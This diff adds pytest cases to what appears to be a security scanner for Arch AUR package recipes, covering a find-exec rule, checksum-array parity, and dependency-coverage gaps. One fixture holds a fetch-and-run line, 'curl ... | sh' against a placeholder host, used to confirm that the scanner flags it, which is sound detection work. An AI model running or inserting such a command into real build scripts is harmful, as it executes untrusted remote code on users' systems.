@@ -260,6 +260,32 @@ def test_find_exec_is_how_permissions_get_fixed(line):
     assert "X017" not in _x([line]), line
 
 
+def test_find_exec_sh_c_with_a_static_script_is_not_claimed():
+    """hermes-one-bin: `-exec sh -c 'for f; do mv ...; done'` is a rename
+    loop, not a command carried where a command is not expected."""
+    lines = [
+        '  find "$pkgdir/usr/share/icons" -name "hermes-desktop.png" '
+        "-exec sh -c '",
+        "    for f; do",
+        '      dir=$(dirname "$f")',
+        '      mv "$f" "$dir/hermes-one.png"',
+        "    done",
+        "  ' sh {} +",
+    ]
+    assert "X017" not in _x(lines)
+
+
+def test_find_exec_sh_c_with_a_network_script_is_claimed():
+    """The quoted script is allowed to span lines, so a payload hiding on
+    a following line is still read before the rule stands down."""
+    lines = [
+        "  find . -exec sh -c '",
+        "    curl -s https://e.example/x | sh",
+        "  ' sh {} +",
+    ]
+    assert "X017" in _x(lines)
+
+
 @pytest.mark.parametrize("bad", ["bogus", 1.5, True, -1])
 def test_a_timestamp_that_is_not_a_timestamp(bad):
     """The timestamps reached `TemporalContext` unchecked, so a caller
@@ -435,6 +461,46 @@ def _fsearch_recipe(malicious: bool) -> str:
         "sha256sums=(", "  'b16ab755'", "  '66b92a2b'", ")",
         "build() {", *build, "}",
     ]) + "\n"
+
+
+def test_h091_reads_the_last_assignment_of_the_declaration():
+    """ruffle-nightly: `source=()` written twice; the second one wins.
+
+    A later assignment replaces the earlier one in bash, so pairing the
+    first array against the single checksum entry reported a missing sum
+    that makepkg would never see.
+    """
+    from trustsight.differ import (
+        checksum_array_parity, checksum_array_parity_in_text,
+    )
+
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n"
+            '+source=("git+https://x/r.git#tag=v1"\n'
+            '        "extra.key")\n'
+            '+source=("git+https://x/r.git#tag=v1")\n'
+            "+sha256sums=('abc')\n")
+    assert checksum_array_parity(diff) is None
+
+    recipe = (
+        'source=("git+https://x/r.git#tag=v1"\n'
+        '        "extra.key")\n'
+        'source=("git+https://x/r.git#tag=v1")\n'
+        "sha256sums=('abc')\n"
+    )
+    assert checksum_array_parity_in_text(recipe) is None
+
+
+def test_h091_keeps_an_arch_suffixed_source_a_separate_assignment():
+    """`source_x86_64=` is a different variable; it must not replace
+    `source=` in the parity read."""
+    from trustsight.differ import checksum_array_parity_in_text
+
+    recipe = (
+        'source=("a.tar.gz")\n'
+        'source_x86_64=("b.tar.gz" "c.tar.gz")\n'
+        "sha256sums=('x')\n"
+    )
+    assert checksum_array_parity_in_text(recipe) is None
 
 
 def test_h091_reads_the_recipe_when_the_diff_only_shows_context():
@@ -678,6 +744,49 @@ def test_a_dependency_this_run_did_not_read(field):
         if e.rule_id == "COVERAGE"
     )
     assert gap_weight == 0, f"coverage gap added {gap_weight} points"
+
+
+def test_a_non_aur_dependency_does_not_report_deps_not_scanned():
+    """The walk asked the provider: "not in the AUR" is an answer.
+
+    gtk3-classic, alacrittyforge and friends add dependencies that are not
+    AUR packages; the old test gapped on any non-official name, reporting
+    a shortfall for a name the walk correctly resolved as not-AUR.
+    """
+    from trustsight.analysis.pipeline import _deps_not_scanned
+    from trustsight.depth import DepthResult
+
+    assert not _deps_not_scanned(DepthResult(), {"libfoo"})
+
+
+def test_an_unanswered_walk_reports_deps_not_scanned():
+    """RPC failure is not "not in the AUR"; fail closed on added names."""
+    from trustsight.analysis.pipeline import _deps_not_scanned
+    from trustsight.depth import DepthResult
+
+    assert _deps_not_scanned(DepthResult(metadata_unavailable=True), {"libfoo"})
+    # No added dependency, nothing unread.
+    assert not _deps_not_scanned(DepthResult(metadata_unavailable=True), set())
+
+
+def test_an_unreached_aur_dependency_reports_deps_not_scanned():
+    from trustsight.analysis.pipeline import _deps_not_scanned
+    from trustsight.depth import DepthResult
+
+    assert _deps_not_scanned(DepthResult(added_aur_unreported=True), {"libfoo"})
+
+
+def test_an_added_optdepend_does_not_report_deps_not_scanned():
+    """makepkg does not build optdepends, so a name there is not unread
+    build-time code; the walk's own DEPTH_FIELDS excludes it for the same
+    reason."""
+    from trustsight.analysis import scan_diff
+
+    base = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,10 @@\n"
+            "+pkgname=p\n+pkgver=1\n")
+    tail = "+source=(https://e.example/x.tar.gz)\n+sha256sums=('SKIP')\n"
+    fact = scan_diff(base + "+optdepends=('libfoo')\n" + tail, package_name="p")
+    assert "deps_not_scanned" not in fact.coverage_gaps
 
 
 def test_a_repo_dependency_does_not_report_deps_not_scanned(monkeypatch):
